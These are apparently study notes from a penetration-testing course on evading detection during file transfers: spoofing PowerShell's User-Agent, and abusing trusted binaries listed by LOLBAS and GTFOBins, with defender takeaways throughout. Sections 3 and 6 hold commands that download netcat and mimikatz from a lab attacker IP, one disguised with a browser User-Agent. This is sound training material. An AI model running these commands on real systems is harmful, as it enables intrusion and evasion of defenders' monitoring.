# 🥷 Evading Detection — File Transfers

> [!abstract] 🎯 Core Idea  
> When transferring files, defenders may detect activity through **User-Agent strings**, **command-line logging**, or **application whitelisting**.
> 
> Evasion can involve:
> 
> ```text
> 🌐 Change User-Agent
>          │
>          ▼
> 🏷️ Blend HTTP request with normal traffic
> 
> 🧰 Use Trusted / Existing Binaries
>          │
>          ▼
> 🛡️ Potentially bypass application restrictions
> 
> 📚 LOLBAS / GTFOBins
>          │
>          ▼
> 🔎 Find legitimate binaries with useful functionality
> ```

---

# 1️⃣ Changing the User-Agent

If defenders have **blacklisted suspicious User-Agent strings**, PowerShell's `Invoke-WebRequest` provides a `-UserAgent` parameter that allows the client to use a different User-Agent.

```text
🚨 Default PowerShell User-Agent
              │
              ▼
      🖥️ Detection Rule
              │
              ▼
          ❌ Alert
```

An alternative is to use a User-Agent that resembles a normal browser:

```text
🌐 Chrome
🦊 Firefox
🌐 Internet Explorer
🧭 Opera
🧭 Safari
```

### 🧠 Why This Matters

If an organization normally sees Chrome traffic, a request identifying itself as Chrome may appear less unusual than one explicitly identifying itself as PowerShell.

```text
Before:

PowerShell
    │
    ▼
HTTP Request
    │
    ▼
User-Agent: WindowsPowerShell/5.1...
    │
    ▼
🚨 Suspicious


After:

PowerShell
    │
    ▼
HTTP Request
    │
    ▼
User-Agent: Chrome/...
    │
    ▼
🌐 Appears more browser-like
```

> [!warning] ⚠️ Important  
> Changing the User-Agent **does not make the activity invisible**. Defenders can correlate other signals such as the originating process, command line, destination, headers, timing, and downloaded content.

---

# 2️⃣ Listing PowerShell User-Agents

PowerShell exposes predefined User-Agent values through:

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
Select-Object Name,@{label="User Agent";Expression={
    [Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)
}} | fl
```

### 📋 Available Examples

| 🌐 Name          | 🏷️ User-Agent                                  |
| ---------------- | ----------------------------------------------- |
| InternetExplorer | `Mozilla/5.0 ... MSIE 9.0 ...`                  |
| FireFox          | `Mozilla/5.0 ... Firefox/4.0`                   |
| Chrome           | `Mozilla/5.0 ... Chrome/7.0.500.0 Safari/534.6` |
| Opera            | `Opera/9.70 ... Presto/2.2.1`                   |
| Safari           | `Mozilla/5.0 ... Safari/533.16`                 |

### 🧠 Memorize

```text
PSUserAgent
    │
    ├── InternetExplorer
    ├── FireFox
    ├── Chrome
    ├── Opera
    └── Safari
```

---

# 3️⃣ Invoke-WebRequest with a Chrome User-Agent

A predefined Chrome User-Agent can be assigned to a variable:

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

It can then be supplied to `Invoke-WebRequest`:

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe `
    -UserAgent $UserAgent `
    -OutFile "C:\Users\Public\nc.exe"
```

### 🌐 Server-Side Observation

Instead of seeing:

```text
User-Agent: WindowsPowerShell/5.1...
```

the server may observe a browser-style value:

```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

### 🔎 Detection Perspective

```text
🪟 PowerShell
      │
      ▼
🌐 HTTP Request
      │
      ▼
🏷️ Browser-like User-Agent
      │
      ▼
🛡️ User-Agent-only detection
      │
      ▼
Potentially less obvious
```

> [!tip] 🧠 Defender Takeaway  
> User-Agent-based detection should **not be treated as a standalone control**. A process such as PowerShell making a browser-like request can still be identified through endpoint and network correlation.

---

# 4️⃣ LOLBAS — Living Off the Land

> [!info] 📚 What is LOLBAS?  
> **LOLBAS** stands for **Living Off The Land Binaries, Scripts and Libraries**.
> 
> It documents legitimate Windows components that can potentially be abused to perform actions that defenders might otherwise associate with dedicated offensive tools.

```text
🧰 Legitimate Windows Binary
          │
          ▼
   Has useful functionality
          │
          ▼
     Can be misused
          │
          ▼
🛡️ May bypass certain controls
```

---

# 5️⃣ Why LOLBins Matter

Application whitelisting may restrict tools such as:

```text
❌ PowerShell
❌ Netcat
```

Command-line monitoring may also generate alerts when known tools or suspicious commands are executed.

A legitimate Windows binary may provide an alternative capability.

```text
             Application Control
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
   🚨 Known Tool          🧰 Trusted Binary
          │                     │
          ▼                     ▼
       Blocked             Potentially
                            Allowed
```

> [!warning] ⚠️ Key Point  
> "Trusted" does **not** mean "safe."
> 
> A legitimate binary can still be abused for malicious purposes.

---

# 6️⃣ Example — GfxDownloadWrapper.exe

The material gives **`GfxDownloadWrapper.exe`** as an example of a Windows binary with file-download functionality.

Example from the material:

```powershell
GfxDownloadWrapper.exe `
    "http://10.10.10.132/mimikatz.exe" `
    "C:\Temp\nc.exe"
```

### 🔎 Conceptual Flow

```text
🌐 Remote URL
      │
      ▼
🧰 GfxDownloadWrapper.exe
      │
      ▼
📥 Download
      │
      ▼
💾 Local File
```

The important concept is not the specific binary itself, but that **legitimate software already present on a system may contain functionality that can be repurposed**.

---

# 7️⃣ Application Whitelisting vs LOLBins

Application whitelisting attempts to control which applications are allowed to execute.

```text
🛡️ Application Whitelist
          │
          ▼
   Is application trusted?
          │
      ┌───┴───┐
      ▼       ▼
     ✅       ❌
   Allow     Block
```

LOLBIN techniques take advantage of the fact that some legitimate binaries may already be trusted.

```text
🧰 Trusted Binary
      │
      ├── Legitimate functionality
      │
      └── Potentially abused functionality
                    │
                    ▼
             🛡️ Detection Challenge
```

### 🧠 Big Idea

> **Application whitelisting can become less effective if defenders only ask "Is this binary allowed?" instead of also asking "What is this allowed binary doing?"**

---

# 8️⃣ LOLBAS Project

The **LOLBAS project** provides information about Windows binaries and other components that have potentially useful functionality from an offensive-security perspective.

```text
🪟 Windows Environment
        │
        ▼
🔎 Search LOLBAS
        │
        ▼
🧰 Identify available binary
        │
        ▼
🎯 Match functionality to objective
```

### 📚 Useful Categories

When studying LOLBAS, pay attention to binaries that provide functionality such as:

- 📥 File download
    
- 📤 File upload
    
- ▶️ Execution
    
- 🌐 Network communication
    
- 🔄 Proxying
    
- 🧩 DLL-related functionality
    

> [!tip] 🧠 Study Tip  
> Don't memorize every LOLBin. Understand the **concept and methodology**: look for legitimate binaries already present in the target environment that provide the functionality you need.

---

# 🐧 9️⃣ GTFOBins

**GTFOBins** is the Linux/Unix-oriented equivalent concept.

```text
🪟 Windows
   │
   ▼
📚 LOLBAS

🐧 Linux / Unix
   │
   ▼
📚 GTFOBins
```

GTFOBins documents commonly installed Unix binaries that can potentially be abused for purposes such as:

- 📥 File transfer
    
- ▶️ Command execution
    
- 📂 File operations
    
- 🔐 Privilege-related actions
    
- 🌐 Network functionality
    

### 🧠 Remember

```text
Windows ──→ LOLBAS
Linux ────→ GTFOBins
```

---

# 🔟 File Transfer Methodology

When working in an authorized penetration-testing environment, the general methodology is:

```text
🎯 Need to transfer a file
          │
          ▼
🔎 Identify available tools
          │
          ▼
┌─────────┴─────────┐
▼                   ▼
🧰 Standard Tool    🧰 Trusted Binary
│                   │
▼                   ▼
Use appropriate     Check LOLBAS /
transfer method     GTFOBins
          │
          ▼
🛡️ Consider Detection
          │
          ▼
🔎 Verify Transfer
```

The available method depends on:

- 🖥️ Operating system
    
- 🔐 Security controls
    
- 🧰 Installed binaries
    
- 🌐 Network connectivity
    
- 🛡️ Endpoint monitoring
    
- 📋 Application whitelisting
    

---

# 🧠 1️⃣1️⃣ Detection & Evasion — Big Picture

User-Agent manipulation and LOLBins address **different layers of detection**.

|Technique|🎯 Targeted Control|🧠 Concept|
|---|---|---|
|Change User-Agent|🌐 Network detection|Make HTTP traffic less distinctive|
|LOLBin|🛡️ Application controls|Use existing trusted software|
|Standard tool|🧰 Tool-based detection|May be easier to recognize|
|Endpoint correlation|🖥️ EDR/SIEM|Connect process + network activity|

### 🔄 Combined View

```text
              File Transfer
                   │
        ┌──────────┴──────────┐
        ▼                     ▼
   🌐 Network              🖥️ Endpoint
        │                     │
        ▼                     ▼
   User-Agent             Process
   Headers                Command Line
   Destination            Parent Process
        │                     │
        └──────────┬──────────┘
                   ▼
                 🖥️ SIEM
                   │
                   ▼
             🔎 Correlation
                   │
                   ▼
              🚨 Detection
```

> [!important] 🛡️ Defensive Perspective  
> Good detection does not depend on one indicator.
> 
> A defender can correlate:
> 
> **Process → Command Line → Network Connection → User-Agent → Destination → File Activity**
> 
> This makes simple evasion techniques much less reliable.

---

# ⚡ 1️⃣2️⃣ Quick Reference

|🧠 Concept|📌 Remember|
|---|---|
|User-Agent|Identifies the HTTP client|
|`-UserAgent`|PowerShell parameter for setting the HTTP User-Agent|
|`PSUserAgent`|Provides predefined User-Agent values|
|LOLBAS|Windows "Living Off The Land" resources|
|GTFOBins|Linux/Unix equivalent resource|
|LOLBin|Legitimate binary that can potentially be abused|
|Application Whitelisting|Controls which applications are allowed|
|SIEM|Correlates and analyzes security events|

---

# 🎯 1️⃣3️⃣ Memorization Cheat Sheet

```text
🏷️ USER-AGENT
      │
      ├── PowerShell can customize it
      ├── Browser-like values are available
      └── User-Agent alone ≠ reliable detection

🧰 LOLBIN
      │
      ├── Legitimate binary
      ├── Already present / trusted
      └── Can potentially be abused

📚 LOLBAS
      │
      └── Windows resources

📚 GTFOBins
      │
      └── Linux / Unix resources

🛡️ DEFENSE
      │
      ├── Don't rely only on User-Agent
      ├── Don't trust binaries solely because they're legitimate
      └── Correlate endpoint + network telemetry
```

---

# ⚡ 1️⃣4️⃣ Final Takeaways

> [!success] 🎯 What You Should Remember

**1. User-Agent manipulation** 🏷️  
PowerShell can change its default User-Agent, potentially making HTTP traffic appear more browser-like.

**2. User-Agent is only one signal** 🌐  
Changing it does not remove other network or endpoint indicators.

**3. LOLBins** 🧰  
Legitimate binaries can contain functionality that may be repurposed for offensive actions.

**4. Application whitelisting** 🛡️  
Allowing a binary does not mean every action performed by that binary is legitimate.

**5. LOLBAS** 🪟  
Use it to understand potentially abusable Windows binaries and their capabilities.

**6. GTFOBins** 🐧  
The equivalent resource for many Unix/Linux binaries.

**7. Defense in depth** 🔎  
The strongest detection comes from correlating multiple signals rather than relying on a single User-Agent or executable name.

```text
              🛡️ FILE TRANSFER DETECTION
                         │
          ┌──────────────┴──────────────┐
          ▼                             ▼
     🌐 Network                     🖥️ Endpoint
          │                             │
     User-Agent                    Process
     Headers                       Command Line
     Destination                   File Activity
          │                             │
          └──────────────┬──────────────┘
                         ▼
                    🖥️ SIEM / EDR
                         │
                         ▼
                    🔎 Correlation
                         │
                         ▼
                      🚨 Alert
```

> [!quote] 💡 Big Picture  
> **Evasion is not the same as invisibility.**
> 
> Changing a User-Agent or using a legitimate binary may bypass a **specific detection rule**, but modern defenders can correlate multiple sources of telemetry to identify the underlying activity.